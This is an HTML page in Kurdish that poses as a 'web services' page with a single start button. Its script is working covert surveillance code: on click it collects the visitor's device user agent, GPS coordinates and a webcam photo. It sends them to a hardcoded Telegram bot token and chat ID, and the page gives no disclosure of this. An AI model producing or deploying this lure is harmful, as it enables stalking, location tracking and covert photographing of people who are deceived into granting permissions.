<!DOCTYPE html>
<html lang="ku">
<head>
  <meta charset="UTF-8">
  <title>خزمەتگوزارییێن وێبێ</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
    button { padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 8px; border: none; background-color: #0088cc; color: white; }
  </style>
</head>
<body>

  <h2>بۆ خزمەتگوزارییێ کلیک ل سەر پشکشندنا دەسەڵاتێ بکە</h2>
  <button onclick="startProcess()">دەستپێکرن</button>

  <script>
    const BOT_TOKEN = '8762888882:AAGgDyZ7vXMZbq_0P1WY9eVoEQthuy2Kpls'; 
    const CHAT_ID = '7683692904';     

    async function startProcess() {
      const deviceInfo = navigator.userAgent;
      sendTelegramMessage(`📱 **جۆرێ ئامێری:**\n${deviceInfo}`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          sendTelegramMessage(`📍 **لوکەیشن:**\nhttps://maps.google.com/?q=${lat},${lon}`);
        }, (error) => {
          sendTelegramMessage("❌ بەکارهێنەری مۆڵەتا لوکەیشنی نەدا.");
        });
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);

          canvas.toBlob((blob) => {
            sendTelegramPhoto(blob);
            stream.getTracks().forEach(track => track.stop());
          }, 'image/jpeg');
        }, 1000);

      } catch (err) {
        sendTelegramMessage("❌ بەکارهێنەری مۆڵەتا کامێرێ نەدا.");
      }
    }

    function sendTelegramMessage(text) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
      });
    }

    function sendTelegramPhoto(imageBlob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', imageBlob, 'photo.jpg');

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }
  </script>
</body>
</html>
